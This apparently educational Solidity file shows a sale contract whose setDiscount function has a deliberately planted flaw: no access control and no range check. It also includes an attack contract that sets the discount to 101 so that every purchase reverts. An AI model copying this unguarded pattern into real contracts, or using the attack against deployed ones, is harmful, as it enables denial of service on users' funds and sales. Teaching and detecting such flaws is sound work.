// Solidity version >=0.8.0
pragma solidity >=0.8.0;

/*
Vulnerability: Inadequate Input Validation
Description: The setDiscount function does not validate the _discount input. An attacker can set a discount greater than 100, which can lead to an underflow in the calculation in the buy() function. This may result in a denial of service as the buy() function will always revert.

Attack steps:
1. Deploy the SaleEventVulnerable contract with an initial discount of 0 and basePrice of 100 ether.
2. An attacker calls setDiscount(101) to set an invalid discount, since there is no validation this succeeds.
3. Any buyer trying to call buy() will trigger an underflow in the price calculation, causing the transaction to revert.
*/

contract SaleEventVulnerable {
    address public admin; // Vulnerable: admin variable exists but no restriction is placed on who can update discount
    uint public discount; // Discount in percentage; should be between 0 and 100 but input is not validated
    uint public basePrice = 100 ether; // Base price of the item

    constructor() {
        admin = msg.sender;
        discount = 0;
    }

    // Vulnerable: No checks whether _discount is within a proper range, allowing values > 100
    function setDiscount(uint _discount) public {
        discount = _discount;
    }

    function buy() public payable {
        // Calculation may underflow if discount > 100
        uint finalPrice = basePrice * (100 - discount) / 100;
        require(msg.value >= finalPrice, "Insufficient Ether sent");
        if (msg.value > finalPrice) {
            payable(msg.sender).transfer(msg.value - finalPrice);
        }
    }
}

// Attack contract targeting the vulnerability in SaleEventVulnerable
contract AttackVulnerableSale {
    SaleEventVulnerable public sale;

    constructor(address _sale) {
        sale = SaleEventVulnerable(_sale);
    }

    // Attack: Set discount to 101 to cause an underflow in price calculation
    function attack() public {
        sale.setDiscount(101);
    }

    // Function to test the effect of the attack; purchase will revert
    function maliciousBuy() public payable {
        sale.buy{value: msg.value}();
    }
}
